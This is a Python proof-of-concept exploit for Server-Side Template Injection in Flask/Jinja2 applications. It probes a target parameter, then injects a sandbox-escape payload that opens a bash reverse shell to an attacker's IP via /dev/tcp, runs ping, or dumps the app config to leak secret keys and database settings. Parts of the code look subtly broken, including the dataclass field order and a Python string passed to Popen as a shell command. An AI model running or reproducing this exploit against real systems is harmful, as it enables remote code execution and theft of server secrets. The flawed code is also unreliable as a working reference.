#!/usr/bin/env python3
"""
SSTI (Server-Side Template Injection) Jinja2 RCE PoC
CVE: N/A (Common vulnerability pattern in Flask/Jinja2)
Target: Flask applications using Jinja2 with user input in templates
Vulnerability: Server-Side Template Injection → RCE

Reference:
- https://portswigger.net/research/server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://secure.wphackedhelp.com/blog/python-flask-jinja2-server-side-template-injection-ssti-bypass-safe-filter/

Exploit Flow:
1. Identify template injection point (input reflected in page)
2. Fingerprint template engine (Jinja2, Twig, etc.)
3. Test basic injection ({{7*7}}, {{config}})
4. Exploit Jinja2 sandbox escape via MRO
5. Access subprocess.Popen or os.system
6. Achieve RCE
"""

import argparse
import requests
import sys
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass(slots=True)
class ExploitContext:
    """SSTI exploit configuration and state."""

    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/"
    param_name: str = "name"

    attacker_ip: str
    attacker_port: int

    command_type: str = "ping"
    proxy: Optional[str] = None

    session: requests.Session = field(default_factory=requests.Session, repr=False)
    ssti_confirmed: bool = field(default=False, repr=False)
    template_engine: str = field(default="", repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            command_type=args.command,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SSTI Jinja2 RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/", help="Vulnerable endpoint")
    target_group.add_argument("--param-name", default="name", help="Vulnerable parameter")

    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP")
    attacker_group.add_argument("listening_port", type=int, help="Attacker port")

    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--command", choices=["ping", "reverse_shell", "read_config"], default="ping")

    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy")

    return parser.parse_args()

def generate_jinja2_rce_payload(ctx: ExploitContext) -> str:
    """Generate Jinja2 RCE payload using MRO."""

    if ctx.command_type == "ping":
        cmd = f"ping -c 4 {ctx.attacker_ip}"
    elif ctx.command_type == "reverse_shell":
        cmd = f"bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'"
    else:  # read_config
        return "{{config}}"

    # Jinja2 RCE via MRO (Method Resolution Order)
    # Access Popen through subclasses
    payload = f"""{{{{''.__class__.__mro__[1].__subclasses__()[414]('import os; os.system("{cmd}")',shell=True,stdout=-1).communicate()}}}}"""

    return payload

def stage_detect(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 1: SSTI Detection & Fingerprinting")

    # Test basic SSTI
    test_payload = "{{7*7}}"

    try:
        response = ctx.session.get(
            ctx.get_target_url(),
            params={ctx.param_name: test_payload},
            proxies=ctx.get_proxies(),
            timeout=10,
            verify=False
        )

        print(f"[*] Testing payload: {test_payload}")

        if "49" in response.text:
            print("[+] SSTI confirmed! Template evaluation detected")
            ctx.ssti_confirmed = True

            # Fingerprint engine
            if "{{" in test_payload and "49" in response.text:
                print("[+] Template engine likely: Jinja2")
                ctx.template_engine = "jinja2"
            return True
        else:
            print("[!] No template evaluation visible")
            return False

    except Exception as e:
        print(f"[-] Detection failed: {e}")
        return False

def stage_exploit(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 2: Exploitation")

    if not ctx.ssti_confirmed:
        print("[!] SSTI not confirmed, proceeding anyway")

    payload = generate_jinja2_rce_payload(ctx)
    print(f"[*] Generated payload:")
    print(f"    {payload[:100]}...")

    try:
        response = ctx.session.get(
            ctx.get_target_url(),
            params={ctx.param_name: payload},
            proxies=ctx.get_proxies(),
            timeout=15,
            verify=False
        )

        print(f"[+] Payload delivered (HTTP {response.status_code})")

        if ctx.command_type == "read_config":
            if "SECRET_KEY" in response.text or "DATABASE" in response.text:
                print("\n[+] Config leaked!")
                print("=" * 60)
                # Extract config portion
                if "<Config" in response.text:
                    start = response.text.find("<Config")
                    end = response.text.find(">", start) + 1
                    print(response.text[start:end])
                else:
                    print(response.text[:500])
                print("=" * 60)

        return True
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False

def main():
    print("[+] SSTI Jinja2 RCE PoC")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_target_url()}")
    print(f"    Parameter: {ctx.param_name}")
    print(f"    Command: {ctx.command_type}")

    try:
        if not stage_detect(ctx):
            print("\n[!] SSTI not detected, but attempting exploitation anyway")

        if not stage_exploit(ctx):
            sys.exit(1)

        print("\n[+] Exploitation completed")
        if ctx.command_type != "read_config":
            print(f"[!] Monitor for callbacks from {ctx.target_ip}")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
